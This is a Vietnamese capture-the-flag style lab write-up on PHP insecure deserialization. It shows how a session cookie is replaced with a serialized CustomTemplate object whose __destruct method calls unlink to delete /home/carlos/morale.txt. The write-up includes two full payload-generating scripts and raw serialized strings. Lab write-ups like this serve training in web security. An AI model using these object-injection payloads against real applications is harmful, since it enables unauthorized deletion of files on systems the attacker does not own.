<img width="1496" height="715" alt="image" src="https://github.com/user-attachments/assets/2a05ad08-3263-4a1a-8846-bff1ccf8c87f" />

Yêu cầu: Xóa file `morale.txt` từ thư mục `home` của `Carlos`.

Thông tin lab cung cấp: lab này sử dụng cơ chế phiên (session) dựa trên quá trình tuần tự hóa (serialization) và do đó dính lỗ hổng tiêm đối tượng tùy ý (arbitrary object injection).

Gợi ý: Đôi khi có thể thêm `~` vào đuôi file để đọc source code.

Account cung cấp: `wiener:peter`.

<img width="2514" height="1443" alt="image" src="https://github.com/user-attachments/assets/6027c30b-b319-4332-abe6-79d953d7a564" />

Sau khi đăng nhập thành công ta phát hiện ra session cookie được dựa trên serialization và được mã hóa base64.

<img width="2563" height="966" alt="image" src="https://github.com/user-attachments/assets/f0f544a1-56ff-4879-a7a1-26481a8fd14c" />

Và dựa vào gợi ý tôi phát hiện ra 1 file `php` ẩn ở trên `View Page Source`:

<img width="2518" height="1443" alt="image" src="https://github.com/user-attachments/assets/f0e9f4d2-d006-4438-9a6a-1d0be0a51ca1" />

Và sau khi chèn thêm `~` ở cuối filename thì tôi đọc được source code của file đấy(lí do tôi có thể đọc được source code là do khi dev dùng các trình soạn thảo trên Linux để chỉnh sửa mã thì thường tự 
động sinh ra 1 file backup tệp này tên giống hệt tên tệp gốc nhưng thêm `~` ở cuối).

<img width="2495" height="1443" alt="image" src="https://github.com/user-attachments/assets/20b08efd-2e91-4bd5-863f-93576638151b" />

Ở đây ta phát hiện ra 1 sink nguy hiểm là hàm `unlink` được gọi bên trong magic method `__destruct` hàm này có thể xóa file dựa vào đường n cung cấp và ở đây ta có thể thay đổi được giá trị của `lock_file_path` dễ dàng. 
Vậy sẽ ra sao nếu ta thay session cookie bằng `Class` chứa hàm `unlink` thay vì `Users` và chờ hàm `__destruct` tự động được gọi.

Thì khi hàm `__destruct` tự động được gọi nó sẽ đi vào hàm `__destruct` bên trong Class `CustomTemplate` và lúc này thì hàm `unlink()` bên trong sẽ được thực thi và nó sẽ xóa đường dẫn mà ta đã truyền
vào.

<img width="2141" height="1288" alt="image" src="https://github.com/user-attachments/assets/711cf3b7-934f-426d-9a34-9069272ebba3" />

Ở đây tôi dùng `vscode` code để nó tự động tạo data serialze để tránh nhầm lẫn trong việc chỉnh sửa chuỗi hay ký tự.

Tôi mã hóa đoạn data kia thành base64 rồi chèn vào cookie.

<img width="2563" height="690" alt="image" src="https://github.com/user-attachments/assets/fc92fdc1-2247-4a45-aea3-6a5639ce6b85" />

<img width="2498" height="1443" alt="image" src="https://github.com/user-attachments/assets/1593cf9f-c0a1-4cc5-b46d-16e163ed5355" />

Ở đây phát hiện ra lỗi thì sau khi xem lại payload tôi phát hiện ra data này không giống định dạng ban đầu 

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"iidepe7jsj584xixzid7ocvn3sqni0gv";}
```
```php
O:14:"CustomTemplate":2:{s:34:"CustomTemplatetemplate_file_path";s:1:"1";s:30:"CustomTemplatelock_file_path";s:22:"home/carlos/morale.txt";}
```

Thì ở đây sau khi tìm hiểu thì tôi phát hiện ra rằng do biến được truyền vào là private nên nó có định dạng khác và cách in ra output cũng đã thiếu, dẫn tới là hàm `unserialize` không nhận dạng được
gây ra lỗi. Thì output thiếu ở đây là `null byte` vì Private: Lưu `\x00Tên_Class\x00Tên_Biến` nhưng nhìn vào output ta thấy không có `null byte` nào do trình duyệt hoặc console không thế in ra 
`Null byte` dẫn tới lỗi.

Cách xử lí ở đây là ta có thể dùng thẳng hàm `base64_encode` để có thể đóng gói đầy đủ output cũng như là mã hóa `base64` luôn. Hoặc đơn giản hơn là ta đổi biến về public vì biến public chỉ lưu mỗi
tên biến.

payload 1:

```php
<?php

class CustomTemplate
{
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path, $lock_file_path)
    {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $lock_file_path;
    }

    function __destruct()
    {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$db = new CustomTemplate("1", "/home/carlos/morale.txt");
$message = serialize($db);
echo base64_encode($message);
echo "\n";
echo base64_decode(base64_encode($message));
```
<img width="2118" height="243" alt="image" src="https://github.com/user-attachments/assets/8a330126-eb52-4add-be13-471d8a3a5c4b" />

payload 2:

```php
<?php

class CustomTemplate
{
    public $template_file_path;
    public $lock_file_path;

    public function __construct($template_file_path, $lock_file_path)
    {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $lock_file_path;
    }

    function __destruct()
    {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$db = new CustomTemplate("1", "/home/carlos/morale.txt");
$message = serialize($db);
echo $message;
echo "\n";
echo base64_encode($message);

```
<img width="2120" height="178" alt="image" src="https://github.com/user-attachments/assets/8ef1a333-250d-46b7-a69c-689a5f200d96" />

Ta thử với payload đầu tiên trước 

<img width="2493" height="1443" alt="image" src="https://github.com/user-attachments/assets/8e50b0cf-3ca2-4332-8514-bec59b003cf3" />

Có thể thấy nó đã thành công unserialzie rồi nhưng do không nhận diện được user nên đã bị lỗi nhưng ta đã thành công xóa file cần xóa vì hàm `__destruct` đã được gọi.
